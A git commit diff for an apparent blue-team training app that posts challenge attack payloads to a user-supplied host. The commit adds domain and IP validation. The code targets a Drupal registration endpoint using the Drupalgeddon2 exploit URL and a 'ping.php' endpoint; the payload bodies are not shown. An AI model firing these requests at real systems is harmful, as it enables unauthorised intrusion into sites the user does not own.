0d17cdab3223e363a8f2a70bd1b97b3991c39971
salsalama <salsalama@protonmail.com>
2020-05-13 19:28:21 -0400

    Added ip and domain validation

--- bluetesterapp/index.js
+++ bluetesterapp/index.js
@@ -7,6 +7,8 @@ const qs = require('qs');
 const path = require('path');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
+const isValidDomain = require('is-valid-domain');
+const isValidIP = require('ip-regex');
 const app = express();
 const PORT = 8081;
 const HOST = '0.0.0.0'
@@ -45,38 +47,43 @@ app.post('/attack',(req, res) => {
 	const challenge = req.body.radio;
         var hash = crypto.createHash('sha256').update(challenge+codeSalt+masterSalt).digest('base64');
 
-	console.log('Host: '+ attck);
-	console.log('CodeSalt ' + codeSalt);
-	console.log('MasterSalt: ' + masterSalt);
-	console.log('Challenge: '+ challenge);
-	console.log('Hash ' + hash);
+	//console.log('Host: '+ attck);
+	//console.log('CodeSalt ' + codeSalt);
+	//console.log('MasterSalt: ' + masterSalt);
+	//console.log('Challenge: '+ challenge);
+	//console.log('Hash ' + hash);
+	
+	if(isValidDomain(attck) || isValidIP({exact: true}).test(attck)){
+		if(challenge == "blue_ch1") {
+			axios.post(
+				'http://' + attck + ':8080/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax',
+				dataCh1 + hash,
+			).then(function (response) {
+				//console.log('Response:' + response);
+			}).catch(function (error) {
+				//console.log(error);
+			});
 
-	if(challenge == "blue_ch1") {
-		axios.post(
-			'http://' + attck + ':8080/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax',
-			dataCh1 + hash,
-		).then(function (response) {
-			//console.log('Response:' + response);
-		}).catch(function (error) {
-			//console.log(error);
-		});
-
-	} else if (challenge == "blue_ch2"){
-		axios.post(
-			'http://' + attck + ':8888/ping.php',
-			dataCh2 + hash,
-		).then(function (response) {
-			//console.log(response);
-		})
-		.catch(function (error) {
-			//console.log(error);
-		});
+		} else if (challenge == "blue_ch2"){
+			axios.post(
+				'http://' + attck + ':8888/ping.php',
+				dataCh2 + hash,
+			).then(function (response) {
+				//console.log(response);
+			})
+			.catch(function (error) {
+				//console.log(error);
+			});
+		} else {
+        	        console.log("Challenge number is not valid");
+       	 	}
+		res.setHeader("Refresh", "7;url=/");
+        	res.sendFile(path.join(__dirname, 'views/request.html'));
 	} else {
-                console.log("Challenge number is not valid: " + challenge);
-        }
-	res.setHeader("Refresh", "7;url=/")
-        res.sendFile(path.join(__dirname, 'views/request.html'));
-
+		console.log("The host is not valid");
+		res.setHeader("Refresh", "30;url=/");
+		res.send("The host entered can not be used by our application, please use an ip address or a domain. Do not enter http:// or the port number!");
+	}
 });
 app.listen(PORT, function () {
 	console.log(`Tester application listening at ${HOST}:${PORT}`)
